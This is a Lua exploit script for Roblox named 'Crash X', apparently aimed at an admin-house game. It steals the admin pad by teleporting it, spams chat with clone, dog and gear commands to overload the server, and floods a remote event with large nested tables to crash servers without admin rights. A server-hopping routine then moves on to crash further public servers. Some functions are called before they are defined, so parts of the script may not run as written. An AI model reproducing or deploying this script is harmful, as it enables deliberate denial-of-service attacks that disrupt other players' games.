-- Created by tech, modified by ts2021
print("Crash X booted. Created by S_P.")

-- // variables \\ --
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin

-- // gamepasses \\ --
local persons = (MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 35748) or MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 37127))
local perm = (MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 66254) or MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 64354))


-- // function discord \\ --

-- // chat function \\ --
local function Chat(msg)
    game.Players:Chat(msg)
end

-- // get a pad \\ --
local function GetPad(msg)
            while PadCheck == true do
                task.wait(0)
                if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
                    if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
                        local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
                        local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
                        task.wait(0.125)
                        pad.CanCollide = false
                        repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        task.wait(0.125)
                        pad.CFrame = padCFrame
                        pad.CanCollide = true
                    else
                        fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
                    end
                end
            end
end

-- // find regen if admin not found \\ --
local function FindPad()
   local regen = game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen")
   local gpad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin")
   task.spawn(function()
      if not regen and not gpad then
          local root = game.Players.LocalPlayer.Character.HumanoidRootPart
          root.Anchored = true
          repeat
          task.wait(.15)
          root.CFrame = CFrame.new(-7.165, root.Position.Y + 2500 , 94.743)
          until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
          root.Anchored = false
          root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
          task.wait(.49)
      end
    end)
    task.wait(1.5)
    if persons then
          RCrash()
          PCrash()
    else     
          KillServer() 
    end
    if not regen then -- if regen not found
      task.wait(10)
    end
    NAK()
end

-- // CRASHES \\ --

-- // perm/no perm but admin crash \\ --
local function KillServer()
    for i = 1,52 do
            Chat("dog all all all                                                                             discord")
    end
    for i = 1,51 do
            Chat("clone all all all                                                                           discord")
    end
    serverhop()
end

-- // persons part of ultra/persons only crash \\ --
local function RCrash()
   Chat("gear all 4842204072                                                                                    discord")
   for i = 1,50 do
       Chat("rocket/all all all                                                                                 discord")
   end
   for i = 1,50 do
       Chat("shield/all all all                                                                                 discord")
   end
end

-- // perm part of ultra/persons only crash \\ --
local function PCrash()
   Chat("respawn all                                                                                            discord")
   Chat("gear all 000000000000000000000000000000004842204072                                                    discord")
   for i = 1,10 do
        Chat("dog all all all                                                                                   discord")
   end
   for i = 1,10 do
        Chat("size all .3")
   end
   for i = 1,10 do
        Chat("freeze all all all                                                                                discord")
   end                                                                            
   for i = 1,10 do
         Chat("size all 10")
   end
   for i = 1,50 do
         Chat("clone all all all                                                                                 discord")
   end
   task.wait(1.1)
   for i = 1,50 do
          Chat("clone all all all                                                                                 discord")
   end
   serverhop()
end

-- // no admin crash \\ --
local function NAK()
 task.spawn(function()
            getgenv().on = true
            while task.wait(1.3) do --// s
                if on then
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0/0)
                    local function getmaxvalue(val)
                        local mainvalueifonetable = 499999
                        if type(val) ~= "number" then
                            return nil
                        end
                        local calculateperfectval = (mainvalueifonetable / (val + 2))
                        return calculateperfectval
                    end

                    local function bomb(tableincrease, tries)
                        local maintable = {}
                        local spammedtable = {}

                        table.insert(spammedtable, {})
                        z = spammedtable[1]

                        for i = 1, tableincrease do
                            local tableins = {}
                            table.insert(z, tableins)
                            z = tableins
                        end

                        local calculatemax = getmaxvalue(tableincrease)
                        local maximum

                        if calculatemax then
                            maximum = calculatemax
                        else
                            maximum = 10000
                        end

                        for i = 1, maximum do
                            table.insert(maintable, spammedtable)
                        end

                        for i = 1, tries do
                            game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
                        end
                    end

                    bomb(250, 2)
                end
            end
        end)
end

-- // TYPES \\ --

-- // perm but no persons \\ --
if not persons and perm then 
    KillServer()

-- // no perm or persons \\ --
elseif not persons and not perm then
        PadCheck = true
        GetPad()
        task.wait(1.5) 
        if adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") == nil then
              FindPad() -- no perm or persons, admin cannot be found
        else
              task.wait(1.5)
              KillServer() -- no perm or persons, admin can be found
        end

-- // perm and persons \\ --
elseif persons and perm then
        RCrash()
        PCrash()

-- // persons but no perm \\ --
elseif persons and not perm then
       PadCheck = true
       GetPad()
       task.wait(1.5) 
       if adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") == nil then
              FindPad() -- admin cannot be found
       else
              task.wait(1.5)
              RCrash()
              PCrash() -- admin can be found
       end

-- // if something doesn't work \\ --
else
print("ERROR! You shouldn't have got this error...")
end

-- // serverhop \\ --
local function serverhop()
    local Servers = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100"))
    for i,v in pairs(Servers.data) do
  	    if v.playing ~= v.maxPlayers then
      	    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, v.id)
        end
    end
end
